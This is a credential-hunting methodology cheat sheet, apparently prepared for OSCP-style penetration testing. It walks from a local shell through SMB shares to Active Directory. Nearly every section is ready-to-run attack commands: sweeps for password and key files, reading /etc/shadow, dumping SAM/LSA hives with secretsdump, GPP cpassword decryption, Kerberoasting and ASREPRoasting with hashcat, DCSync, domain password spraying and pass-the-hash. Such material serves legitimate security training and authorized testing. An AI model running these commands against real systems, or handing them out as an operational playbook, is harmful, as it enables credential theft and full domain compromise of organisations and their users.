# Credential Hunting Methodology (Local Shell → SMB Shares → Active Directory)

Ordered as you'd actually run it: local box first (fastest, no auth needed beyond your shell), then SMB shares, then AD-wide credential/attribute hunting once you have a foothold in the domain.

---

## Phase 0 — On the box you just landed a shell on (Windows or Linux)

### 0.1 Fast full-filesystem text sweep

```bash
# Linux
grep -riE "password|passwd|pwd|secret|apikey|api_key|token|credential|pass=|user=" \
  /home /root /var/www /opt /etc /srv /tmp /var/backups \
  --include="*.{txt,conf,cnf,cfg,ini,xml,yml,yaml,json,sh,py,php,log,bak,old}" \
  2>/dev/null

# Common single-shot files worth checking directly
cat /etc/passwd /etc/shadow 2>/dev/null   # shadow only if root/readable
find / -name "*.kdbx" -o -name "id_rsa*" -o -name "*.pem" -o -name "known_hosts" 2>/dev/null
```

```powershell
# Windows
findstr /si password *.txt *.ini *.cfg *.config *.xml *.yml 2>nul
Get-ChildItem -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.yml -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|pwd|secret|apikey" -List
```

### 0.2 Config/app-specific creds (highest hit rate)

```bash
# Linux — web app configs, DB configs, CI files
cat /var/www/html/**/wp-config.php 2>/dev/null | grep -i DB_
cat /var/www/html/**/.env 2>/dev/null
find / -iname "wp-config.php" -o -iname ".env" -o -iname "config.php" -o -iname "settings.py" 2>/dev/null
cat ~/.bash_history /root/.bash_history 2>/dev/null
cat /etc/*-release; cat /etc/fstab   # sometimes reveals mount creds
```

```powershell
# Windows — unattend/sysprep, IIS, registry autologon, PS history
Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf,web.config -Recurse -EA SilentlyContinue
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Decision point:** if `.env` / `wp-config.php` / `web.config` found with DB creds → try credential reuse against MySQL/MSSQL locally, and against any domain account with the same username via SMB/WinRM (password reuse is extremely common on OSCP boxes).

### 0.3 Memory / process / service creds

```bash
# Linux — process env vars, cron, systemd unit files
for pid in $(ls /proc | grep -E '^[0-9]+$'); do cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i pass; done
cat /etc/cron* -r 2>/dev/null
grep -ri "password" /etc/systemd/system/*.service 2>/dev/null
```

```powershell
# Windows — unattended services, scheduled tasks, saved creds vault
cmdkey /list
schtasks /query /fv | findstr /i "run as"
Get-WmiObject -Class Win32_Service | Select Name, StartName, PathName
reg query HKLM\SAM   # often denied without SYSTEM
```

**Decision point:** if SYSTEM/local admin already reached → dump SAM/LSA for local + cached domain hashes:

```powershell
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save & reg save HKLM\SECURITY security.save
# offline:
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Or live, if creds/hash already available:

```bash
secretsdump.py <domain>/<user>:<password>@<target>
```

### 0.4 Password managers / browser stores / dotfiles

```bash
find / -iname "*.kdbx" -o -iname "logins.json" -o -iname "Login Data" 2>/dev/null
cat ~/.git-credentials ~/.netrc ~/.aws/credentials ~/.ssh/config 2>/dev/null
```

```powershell
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -Include "Login Data","Cookies" -Recurse -EA SilentlyContinue
```

Note if `.kdbx` found: crack offline with `keepass2john` → `hashcat -m 13400`.

---

## Phase 1 — SMB shares (unauthenticated → authenticated enumeration)

### 1.1 Enumerate accessible shares

```bash
smbclient -N -L //<target>/                         # null session
netexec smb <target> -u '' -p '' --shares            # anon
netexec smb <target> -u <user> -p '<password>' --shares
crackmapexec smb <target> -u <user> -p '<password>' --shares   # if using older cme
```

### 1.2 Recursively pull and grep everything readable

```bash
smbclient //<target>/<share> -N -c 'recurse ON; prompt OFF; mget *'
# then locally:
grep -riE "password|secret|pwd|cred|pass=" -R ./<share> --include="*.{txt,xml,ini,config,cnf,yml,ps1,bat,vbs,kdbx}"
```

Or mount and sweep in place:

```bash
mkdir /mnt/smbshare && mount -t cifs //<target>/<share> /mnt/smbshare -o username=<user>,password=<password>
grep -riE "password|secret" -R /mnt/smbshare
```

### 1.3 High-value SMB targets specifically

```bash
# SYSVOL / NETLOGON — GPP passwords, logon scripts, GPO configs
smbclient //<dc>/SYSVOL -U '<domain>\<user>%<password>' -c 'recurse ON; prompt OFF; mget *'
find . -iname "Groups.xml" -o -iname "*.vbs" -o -iname "*.bat" -o -iname "*.ps1" 2>/dev/null

# GPP cpassword decrypt (still shows on old GPOs)
gpp-decrypt <cpassword_blob>
```

**Decision point:** if `Groups.xml`/`Services.xml`/`ScheduledTasks.xml` with `cpassword=` attribute found → `gpp-decrypt` it, this is an AES key Microsoft published — instant plaintext.

```bash
# NETLOGON — startup scripts often embed service account creds
smbclient //<dc>/NETLOGON -U '<domain>\<user>%<password>' -c 'recurse ON; prompt OFF; mget *'
```

### 1.4 Enumerate all shares domain-wide (once you have any valid creds)

```bash
netexec smb <dc_ip> -u <user> -p '<password>' --shares -M spider_plus   # crawls all shares, dumps file list/content
netexec smb <dc_ip> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true   # actually pull files
```

---

## Phase 2 — Active Directory-wide credential & attribute hunting (once you have domain creds)

### 2.1 LDAP: creds stashed in AD object attributes (description, info fields — very common misconfig)

```bash
ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' \
  -b "DC=<domain>,DC=<tld>" "(objectClass=user)" description | grep -B5 description

netexec ldap <dc_ip> -u <user> -p '<password>' -M get-desc-users   # netexec module pulls description fields for all users
netexec ldap <dc_ip> -u <user> -p '<password>' --users | grep -i pass   # quick eyeball
```

### 2.2 BloodyAD / bloodhound-style attribute + ACL sweep

```bash
bloodyAD -d <domain> -u <user> -p '<password>' --host <dc_ip> get search --filter "(objectClass=user)" --attr description
bloodyAD -d <domain> -u <user> -p '<password>' --host <dc_ip> get object '<targetuser>' --attr *   # dump all attrs, check info/comment/userPassword
```

### 2.3 SYSVOL/GPO-based domain-wide sweep (bigger than one DC share, covers all GPOs)

```bash
netexec smb <dc_ip> -u <user> -p '<password>' -M gpp_password        # netexec's built-in GPP finder across SYSVOL
netexec smb <dc_ip> -u <user> -p '<password>' -M gpp_autologin       # finds autologon creds in GPO prefs
```

### 2.4 Kerberoasting / ASREPRoasting (credential _extraction_ rather than hunting, but same phase)

```bash
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request      # kerberoast all SPN accounts
GetNPUsers.py <domain>/ -usersfile <userlist.txt> -dc-ip <dc_ip> -no-pass -format hashcat  # ASREP for accounts with preauth disabled
hashcat -m 13100 kerberoast.txt rockyou.txt      # kerberoast hash type
hashcat -m 18200 asrep.txt rockyou.txt           # asrep hash type
```

### 2.5 DCSync / cached credential extraction (needs replication rights or DA)

```bash
secretsdump.py <domain>/<user>:<password>@<dc_ip>          # attempts DCSync if rights allow, dumps NTDS
netexec smb <dc_ip> -u <user> -p '<password>' -M ntdsutil   # alt NTDS extraction
```

**Decision point:** BloodHound-collected data shows `<user>` has `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` → DCSync is viable, run secretsdump directly against DC.

### 2.6 Credential stuffing / password spray across the domain (once a leaked/default/pattern password is found)

```bash
# Build userlist first
netexec smb <dc_ip> -u <user> -p '<password>' --users | awk '{print $5}' > users.txt
kerbrute userenum -d <domain> --dc <dc_ip> users.txt          # validate real usernames w/o lockout risk (kerberos preauth)

# Spray one password against all users (respect lockout policy!)
netexec smb <dc_ip> -u users.txt -p '<candidate_password>' --continue-on-success
# Check lockout threshold first:
netexec smb <dc_ip> -u <user> -p '<password>' --pass-pol
```

**Decision point:** always check `--pass-pol` lockout threshold before spraying — one bad spray can lock out the whole domain and tank your exam.

### 2.7 Credential reuse pivot

Any credential found in Phase 0/1 (local admin, service account, app DB user) — always test:

```bash
netexec smb <dc_ip> -u <found_user> -p '<found_password>'      # does it work domain-wide?
netexec winrm <dc_ip> -u <found_user> -p '<found_password>'
netexec smb <dc_ip> -u <found_user> -H '<found_ntlm_hash>'     # pass-the-hash if only hash recovered
```

---

## Priority Fast-Path (try these first, in order)

1. **GPP cpassword in SYSVOL** (`Groups.xml` → `gpp-decrypt`) — near-zero effort, instant plaintext if present.
2. **LDAP description/info field dump** — extremely common junior-admin mistake, one command.
3. **Local box config files** (`.env`, `web.config`, `wp-config.php`) — highest density of real creds per minute spent.
4. **Kerberoasting / ASREPRoasting** — near-zero risk, always run once you have any domain creds or a valid userlist.
5. **SMB share-wide grep via `spider_plus`** — casts the widest net with one command.
6. **Credential/hash reuse across protocols** (SMB → WinRM → RDP) — cheapest lateral move once anything is found.
7. **Password spray** (only after checking lockout policy) — highest risk/reward, do last among the low-effort options.
8. **DCSync** — needs elevated rights, usually the payoff at the end of an ACL-abuse or DA chain, not a starting point.

---

Document _why_ you ran each command — which enumeration result (a share you could read, a GPO you could browse, a description field you spotted) justified pulling it — OSCP reporting grades the reasoning chain, not just the loot.